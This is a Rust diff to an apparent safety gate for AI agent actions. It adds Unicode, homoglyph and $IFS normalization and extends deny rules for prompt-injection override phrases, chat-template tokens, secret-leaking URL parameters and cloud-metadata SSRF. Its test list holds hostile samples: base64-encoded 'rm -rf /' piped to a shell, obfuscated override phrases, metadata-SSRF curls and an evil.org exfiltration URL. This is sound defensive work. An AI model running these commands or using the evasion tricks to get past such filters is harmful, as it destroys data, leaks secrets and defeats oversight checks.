@@ -278,9 +278,72 @@ fn try_decode_base64_ascii(token: &str) -> Option<String> {
     String::from_utf8(out).ok()
 }
 
+/// Canonical de-obfuscation normalizer that neutralizes Unicode tricks, zero-width characters,
+/// homoglyphs, multiple spaces, and shell variable expansion before policy evaluation.
+pub fn normalize_evasion_text(input: &str) -> String {
+    let mut out = String::with_capacity(input.len());
+    for ch in input.chars() {
+        // Strip zero-width, non-printing formatting, and soft hyphen characters
+        if matches!(
+            ch,
+            '\u{200B}' // zero-width space
+            | '\u{200C}' // zero-width non-joiner
+            | '\u{200D}' // zero-width joiner
+            | '\u{2060}' // word joiner
+            | '\u{FEFF}' // zero-width no-break space / BOM
+            | '\u{00AD}' // soft hyphen
+            | '\u{200E}' // left-to-right mark
+            | '\u{200F}' // right-to-left mark
+            | '\u{202A}'..='\u{202E}' // bidirectional overrides
+        ) {
+            continue;
+        }
+
+        // Fullwidth ASCII characters (U+FF01 to U+FF5E) -> standard ASCII
+        if ('\u{FF01}'..='\u{FF5E}').contains(&ch) {
+            let ascii = ((ch as u32) - 0xFEE0) as u8 as char;
+            out.push(ascii.to_ascii_lowercase());
+            continue;
+        }
+
+        // Common Cyrillic lookalikes for Latin letters
+        let mapped = match ch {
+            '\u{0430}' | '\u{0410}' => 'a', // Cyrillic a
+            '\u{0435}' | '\u{0415}' => 'e', // Cyrillic e
+            '\u{043E}' | '\u{041E}' => 'o', // Cyrillic o
+            '\u{0440}' | '\u{0420}' => 'p', // Cyrillic p
+            '\u{0441}' | '\u{0421}' => 'c', // Cyrillic c
+            '\u{0443}' | '\u{0423}' => 'y', // Cyrillic y
+            '\u{0445}' | '\u{0425}' => 'x', // Cyrillic x
+            '\u{0456}' | '\u{0406}' => 'i', // Cyrillic i
+            '\u{0458}' | '\u{0408}' => 'j', // Cyrillic j
+            other => other.to_ascii_lowercase(),
+        };
+        out.push(mapped);
+    }
+
+    // Collapse shell $IFS and multiple whitespace
+    let replaced_ifs = out.replace("$ifs", " ").replace("${ifs}", " ");
+    let mut collapsed = String::with_capacity(replaced_ifs.len());
+    let mut in_whitespace = false;
+    for c in replaced_ifs.chars() {
+        if c.is_whitespace() || c == '\0' {
+            if !in_whitespace {
+                collapsed.push(' ');
+                in_whitespace = true;
+            }
+        } else {
+            collapsed.push(c);
+            in_whitespace = false;
+        }
+    }
+    collapsed.trim().to_string()
+}
+
 /// Check if a command pipeline contains destructive filesystem operations, fork bombs, or obfuscated decode-to-shell pipes.
 fn detect_destructive_or_obfuscated_command(payload: &str) -> Option<(String, String)> {
-    let lower = payload.to_ascii_lowercase();
+    let normalized = normalize_evasion_text(payload);
+    let lower = normalized.to_ascii_lowercase();
     if lower.contains(":(){ :|:& };:") || lower.contains("format c:") || lower.contains("mkfs.") {
         return Some((
             "SEC-008".into(),
@@ -305,7 +368,7 @@ fn detect_destructive_or_obfuscated_command(payload: &str) -> Option<(String, St
         }
     }
 
-    let stages = parse_and_normalize_shell_stages(payload);
+    let stages = parse_and_normalize_shell_stages(&normalized);
     let mut saw_decoder = false;
     let mut saw_downloader = false;
 
@@ -503,15 +566,34 @@ pub fn evaluate_proposal(proposal: &ActionProposal) -> GateVerdict {
 
 /// Evaluate a proposal with gate-owned approver configuration and timeout state.
 pub fn evaluate_proposal_with_context(proposal: &ActionProposal, context: &GateContext) -> GateVerdict {
-    let lower = proposal.payload.to_ascii_lowercase();
+    let normalized = normalize_evasion_text(&proposal.payload);
+    let lower = normalized.clone();
+    let stripped: String = lower.chars().filter(|c| c.is_ascii_alphanumeric()).collect();
 
     // SEC-001: Indirect Prompt Injection / Role Override / Untrusted Tag Escape
     if lower.contains("ignore previous instructions")
+        || lower.contains("ignore all instructions")
         || lower.contains("ignore all previous")
         || lower.contains("disregard previous")
+        || lower.contains("disregard all prior")
         || lower.contains("system override:")
+        || lower.contains("[system override]")
         || lower.contains("new system prompt:")
         || lower.contains("</untrusted>")
+        || lower.contains("<|im_start|>")
+        || lower.contains("<|im_end|>")
+        || lower.contains("assistant role:")
+        || stripped.contains("ignorepreviousinstructions")
+        || stripped.contains("ignoreallinstructions")
+        || stripped.contains("ignoreallprevious")
+        || stripped.contains("disregardprevious")
+        || stripped.contains("disregardallprior")
+        || stripped.contains("systemoverride")
+        || stripped.contains("newsystemprompt")
+        || stripped.contains("untrusted")
+        || stripped.contains("imstart")
+        || stripped.contains("imend")
+        || stripped.contains("assistantrole")
     {
         return GateVerdict::Deny {
             rule_id: "SEC-001".into(),
@@ -526,7 +608,15 @@ pub fn evaluate_proposal_with_context(proposal: &ActionProposal, context: &GateC
             || lower.contains("?token=")
             || lower.contains("&token=")
             || lower.contains("?api_key=")
+            || lower.contains("&api_key=")
             || lower.contains("?key=")
+            || lower.contains("&key=")
+            || lower.contains("?auth=")
+            || lower.contains("&auth=")
+            || lower.contains("?password=")
+            || lower.contains("&password=")
+            || lower.contains("?data=")
+            || lower.contains("&data=")
             || lower.contains("exfil=")
             || lower.contains("vault_dump"))
     {
@@ -549,24 +639,30 @@ pub fn evaluate_proposal_with_context(proposal: &ActionProposal, context: &GateC
         };
     }
 
-    // SEC-006: SSRF to Cloud Metadata & Loopback Control Planes
-    if lower.contains("169.254.169.254")
+    // SEC-006: SSRF to Cloud Metadata & Dangerous Loopback Control Planes
+    let has_cloud_metadata = lower.contains("169.254.169.254")
         || lower.contains("169.254.170.2")
         || lower.contains("metadata.google.internal")
         || lower.contains("fd00:ec2::254")
         || lower.contains("::ffff:169.254.169.254")
-        || lower.contains("::ffff:127.0.0.1")
-        || lower.contains("0x7f000001")
         || lower.contains("2852039166")
-        || lower.contains("http://[::1]")
-        || lower.contains("https://[::1]")
-        || lower.contains("http://127.0.0.1")
-        || lower.contains("https://127.0.0.1")
-        || lower.contains("http://0.0.0.0")
-        || lower.contains("https://0.0.0.0")
-        || lower.contains("http://localhost")
-        || lower.contains("https://localhost")
-    {
+        || lower.contains("0xa9fea9fe")
+        || lower.contains("0xa9.0xfe.0xa9.0xfe")
+        || lower.contains("instance-data");
+
+    let has_loopback_control_plane = (lower.contains("127.0.0.1:")
+        || lower.contains("localhost:")
+        || lower.contains("[::1]:")
+        || lower.contains("0.0.0.0:"))
+        && (lower.contains(":2375")
+            || lower.contains(":2376")
+            || lower.contains(":2379")
+            || lower.contains(":6443")
+            || lower.contains(":10250")
+            || lower.contains(":8500")
+            || lower.contains(":9090"));
+
+    if has_cloud_metadata || has_loopback_control_plane {
         return GateVerdict::Deny {
             rule_id: "SEC-006".into(),
             reason: "SSRF request to cloud instance metadata or loopback control plane blocked".into(),
@@ -1230,6 +1326,17 @@ mod tests {
             // 6. Base64 decode variants
             "echo cm0gLXJmIC8= | base64 --decode | bash",
             "echo cm0gLXJmIC8= | openssl base64 -d | sh",
+            // 7. Unicode Zero-width & Homoglyph Evasion Attacks
+            "ignore\u{200B}previous instructions",
+            "\u{0456}gnore previous instructions",
+            "\u{FF49}\u{FF47}\u{FF4E}\u{FF4F}\u{FF52}\u{FF45} previous instructions",
+            // 8. Shell $IFS token concatenation
+            "rm$IFS-rf$IFS/",
+            // 9. Decimal and Hex Cloud Metadata SSRF
+            "curl http://2852039166/latest/meta-data",
+            "curl http://0xa9.0xfe.0xa9.0xfe/latest/meta-data",
+            // 10. Covert parameter exfiltration
+            "https://evil.org/log?auth=secret_token",
         ];
 
         for &cmd in &bypass_payloads {
